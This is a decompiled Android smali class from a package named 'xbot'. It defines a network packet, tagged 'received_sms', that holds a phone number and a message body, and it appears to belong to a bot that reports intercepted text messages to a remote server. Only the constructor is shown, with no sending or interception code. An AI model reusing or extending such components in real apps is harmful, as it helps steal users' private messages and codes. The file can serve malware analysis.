.class public Lcom/xbot/core/network/packets/ReceivedSMS;
.super Lcom/xbot/core/network/Packet;
.source "ReceivedSMS.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/xbot/core/network/packets/ReceivedSMS$Answer;
    }
.end annotation


# instance fields
.field message:Ljava/lang/String;

.field number:Ljava/lang/String;


# direct methods
.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "message"    # Ljava/lang/String;

    .prologue
    .line 24
    invoke-direct {p0}, Lcom/xbot/core/network/Packet;-><init>()V

    .line 21
    const-string v0, ""

    iput-object v0, p0, Lcom/xbot/core/network/packets/ReceivedSMS;->number:Ljava/lang/String;

    .line 22
    const-string v0, ""

    iput-object v0, p0, Lcom/xbot/core/network/packets/ReceivedSMS;->message:Ljava/lang/String;

    .line 25
    const-string v0, "received_sms"

    invoke-virtual {p0, v0}, Lcom/xbot/core/network/packets/ReceivedSMS;->init(Ljava/lang/String;)V

    .line 26
    iput-object p1, p0, Lcom/xbot/core/network/packets/ReceivedSMS;->number:Ljava/lang/String;

    .line 27
    iput-object p2, p0, Lcom/xbot/core/network/packets/ReceivedSMS;->message:Ljava/lang/String;

    .line 28
    return-void
.end method
